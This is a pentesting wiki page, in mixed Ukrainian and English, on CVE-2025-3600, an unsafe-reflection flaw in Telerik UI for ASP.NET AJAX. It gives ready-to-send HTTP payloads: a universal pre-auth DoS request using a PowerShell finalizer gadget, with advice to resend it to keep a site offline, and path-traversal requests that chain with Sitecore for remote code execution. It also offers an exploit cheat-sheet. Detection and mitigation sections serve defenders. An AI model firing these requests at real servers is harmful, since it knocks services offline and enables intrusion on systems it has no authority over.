# Telerik UI for ASP.NET AJAX – Unsafe Reflection via WebResource.axd (type=iec)

{{#include ../../banners/hacktricks-training.md}}

> Pre‑auth виконання конструктора в обробнику кешу Image Editor Telerik UI for ASP.NET AJAX дозволяє універсальний DoS і, у багатьох додатках, pre‑auth RCE через ціль‑специфічні гаджети (CVE-2025-3600).

## TL;DR

- Affected component/route: Telerik.Web.UI.WebResource.axd with query type=iec (Image Editor cache handler). Exposed pre‑auth in many products.
- Primitive: Атакуючий контролює ім'я типу (prtype). Обробник резолвить його за допомогою Type.GetType() та викликає Activator.CreateInstance() перед перевіркою безпеки типу інтерфейсу. Буде виконано будь‑який публічний параметр‑безпараметричний конструктор .NET типу.
- Impact:
  - Universal pre‑auth DoS with a .NET framework gadget (PowerShell WSMan finalizer).
  - Часто ескалує до pre‑auth RCE в реальних розгортаннях шляхом зловживання app‑specific гаджетами, особливо insecure AppDomain.AssemblyResolve handlers.
  - Fix: Update to Telerik UI for ASP.NET AJAX 2025.1.416+ or remove/lock the handler.

## Affected versions

- Telerik UI for ASP.NET AJAX versions 2011.2.712 through 2025.1.218 (inclusive) are vulnerable.
- Fixed in 2025.1.416 (released 2025-04-30). Оновіть негайно або видаліть/заблокуйте цей обробник.

## Affected surface and quick discovery

- Check exposure:
- GET /Telerik.Web.UI.WebResource.axd should return something other than 404/403 if the handler is wired.
- Inspect web.config for handlers mapping to Telerik.Web.UI.WebResource.axd.
- Trigger path for the vulnerable code-path requires: type=iec, dkey=1, and prtype=<AssemblyQualifiedType>.

Example probe and generic trigger:
```http
GET /Telerik.Web.UI.WebResource.axd?type=iec&dkey=1&prtype=Namespace.Type, Assembly
```
Примітки
- Деякі PoCs використовують dtype; реалізація перевіряє dkey=="1" для потоку завантаження.
- prtype має бути assembly-qualified або розв'язуваним у поточному AppDomain.

## Корінна причина – unsafe reflection в ImageEditorCacheHandler

Потік завантаження кешу Image Editor створює екземпляр типу, переданого в prtype, і лише потім приводить його до ICacheImageProvider та перевіряє ключ завантаження. Конструктор вже виконався, коли перевірка не пройшла.

<details>
<summary>Відповідний декомпільований потік</summary>
```csharp
// entrypoint
public void ProcessRequest(HttpContext context)
{
string text = context.Request["dkey"];           // dkey
string text2 = context.Request.Form["encryptedDownloadKey"]; // download key
...
if (this.IsDownloadedFromImageProvider(text)) // effectively dkey == "1"
{
ICacheImageProvider imageProvider = this.GetImageProvider(context); // instantiation happens here
string key = context.Request["key"];
if (text == "1" && !this.IsValidDownloadKey(text2))
{
this.CompleteAsBadRequest(context.ApplicationInstance);
return; // cast/check happens after ctor has already run
}
using (EditableImage editableImage = imageProvider.Retrieve(key))
{
this.SendImage(editableImage, context, text, fileName);
}
}
}

private ICacheImageProvider GetImageProvider(HttpContext context)
{
if (!string.IsNullOrEmpty(context.Request["prtype"]))
{
return RadImageEditor.InitCacheImageProvider(
RadImageEditor.GetICacheImageProviderType(context.Request["prtype"]) // [A]
);
}
...
}

public static Type GetICacheImageProviderType(string imageProviderTypeName)
{
return Type.GetType(string.IsNullOrEmpty(imageProviderTypeName) ?
typeof(CacheImageProvider).FullName : imageProviderTypeName); // [B]
}

protected internal static ICacheImageProvider InitCacheImageProvider(Type t)
{
// unsafe: construct before enforcing interface type-safety
return (ICacheImageProvider)Activator.CreateInstance(t); // [C]
}
```
</details>

Примітив експлуатації: Керований рядок типу → Type.GetType resolves it → Activator.CreateInstance runs its public parameterless constructor. Навіть якщо запит потім відхилено, побічні ефекти гаджета вже відбулися.

## Універсальний DoS gadget (не вимагає специфічних для застосунку gadgets)

Class: System.Management.Automation.Remoting.WSManPluginManagedEntryInstanceWrapper in System.Management.Automation (PowerShell) має фіналізатор, який disposes an uninitialized handle, викликаючи необроблене виключення під час фіналізації GC. Це надійно спричинює крах IIS worker process незабаром після інстанціації.

One‑shot DoS request:
```http
GET /Telerik.Web.UI.WebResource.axd?type=iec&dkey=1&prtype=System.Management.Automation.Remoting.WSManPluginManagedEntryInstanceWrapper,+System.Management.Automation,+Version%3d3.0.0.0,+Culture%3dneutral,+PublicKeyToken%3d31bf3856ad364e35
```
Notes
- Продовжуйте надсилати періодично, щоб утримувати сайт офлайн. Ви можете спостерігати, як constructor спрацьовує у debugger; crash відбувається під час finalization.

## From DoS to RCE – escalation patterns

Unsafe constructor execution відкриває багато target‑specific gadgets і ланцюжків. Шукайте:

1) Parameterless constructors that process attacker input
- Some ctors (or static initializers) immediately read Request query/body/cookies/headers and (de)serialize them.
- Example (Sitecore): a ctor chain reaches GetLayoutDefinition() which reads HTTP body "layout" and deserializes JSON via JSON.NET.

2) Constructors that touch files
- Ctros that load or deserialize config/blobs from disk can be coerced if you can write to those paths (uploads/temp/data folders).

3) Constructors performing app-specific ops
- Resetting state, toggling modules, or terminating processes.

4) Constructors/static ctors that register AppDomain event handlers
- Many apps add AppDomain.CurrentDomain.AssemblyResolve handlers that build DLL paths from args.Name without sanitization. If you can influence type resolution you can coerce arbitrary DLL loads from attacker‑controlled paths.

5) Forcing AssemblyResolve via Type.GetType
- Request a non-existent type to force CLR resolution and invoke registered (possibly insecure) resolvers. Example assembly-qualified name:
```
This.Class.Does.Not.Exist, watchTowr
```
6) Фіналізатори з руйнівними побічними ефектами
- Деякі типи видаляють файли з фіксованим шляхом у фіналізаторах. У поєднанні з переходом за посиланнями або передбачуваними шляхами це може дозволити локальне підвищення привілеїв у певних середовищах.

## Приклад pre‑auth RCE ланцюга (Sitecore XP)

- Step 1 – Pre‑auth: Викличте тип, чий static/instance ctor реєструє небезпечний обробник AssemblyResolve (наприклад, Sitecore’s FolderControlSource у ControlFactory).
- Step 2 – Post‑auth: Отримайте запис у resolver-probed директорію (наприклад, через auth bypass або ненадійне завантаження) і розмістіть шкідливий DLL.
- Step 3 – Pre‑auth: Використайте CVE‑2025‑3600 з неіснуючим типом та ім'ям збірки, що містить traversal, щоб примусити резольвер завантажити ваш розміщений DLL → виконання коду під IIS worker.

Trigger examples
```http
# Load the insecure resolver (no auth on many setups)
GET /-/xaml/Sitecore.Shell.Xaml.WebControl

# Coerce the resolver via Telerik unsafe reflection
GET /Telerik.Web.UI.WebResource.axd?type=iec&dkey=1&prtype=watchTowr.poc,+../../../../../../../../../watchTowr
```
## Валідація, пошук і нотатки DFIR

- Safe lab validation: Fire the DoS payload and watch for app pool recycle/unhandled exception tied to the WSMan finalizer.
- Hunt in телеметрії:
  - Requests to /Telerik.Web.UI.WebResource.axd with type=iec and odd prtype values.
  - Failed type loads and AppDomain.AssemblyResolve events.
  - Sudden w3wp.exe crashes/recycles following such requests.

## Mitigation

- Patch to Telerik UI for ASP.NET AJAX 2025.1.416 or later.
- Remove or restrict exposure of Telerik.Web.UI.WebResource.axd where possible (WAF/rewrites).
- Ignore or harden prtype handling server-side (upgrade applies proper checks before instantiation).
- Audit and harden custom AppDomain.AssemblyResolve handlers. Avoid building paths from args.Name without sanitization; prefer strong-named loads or whitelists.
- Constrain upload/write locations and prevent DLL drops into probed directories.
- Monitor for non-existent type load attempts to catch resolver abuse.

## Cheat‑sheet

- Presence check:
  - GET /Telerik.Web.UI.WebResource.axd
  - Look for handler mapping in web.config
- Exploit skeleton:
```http
GET /Telerik.Web.UI.WebResource.axd?type=iec&dkey=1&prtype=<TypeName,+Assembly,+Version=..., +PublicKeyToken=...>
```
- Universal DoS:
```http
...&prtype=System.Management.Automation.Remoting.WSManPluginManagedEntryInstanceWrapper,+System.Management.Automation,+Version%3d3.0.0.0,+Culture%3dneutral,+PublicKeyToken%3d31bf3856ad364e35
```
- Тригер резолвера:
```
This.Class.Does.Not.Exist, watchTowr
```
## Пов'язані техніки

- IIS post-exploitation, .NET key extraction, та in‑memory loaders:

{{#ref}}
iis-internet-information-services.md
{{#endref}}

- ASP.NET ViewState deserialization та machineKey abuses:

{{#ref}}
../../pentesting-web/deserialization/exploiting-__viewstate-parameter.md
{{#endref}}

## Джерела

- [watchTowr labs – More than DoS: Progress Telerik UI for ASP.NET AJAX Unsafe Reflection (CVE-2025-3600)](https://labs.watchtowr.com/more-than-dos-progress-telerik-ui-for-asp-net-ajax-unsafe-reflection-cve-2025-3600/)
- [Black Hat USA 2019 – SSO Wars: The Token Menace (Mirosh & Muñoz) – DoS gadget background](https://i.blackhat.com/USA-19/Wednesday/us-19-Munoz-SSO-Wars-The-Token-Menace-wp.pdf)
- [ZDI – Abusing arbitrary file deletes to escalate privilege](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)
- [watchTowr – Is “B” for Backdoor? (Sitecore chain CVE-2025-34509)](https://labs.watchtowr.com/is-b-for-backdoor-pre-auth-rce-chain-in-sitecore-experience-platform/)

{{#include ../../banners/hacktricks-training.md}}
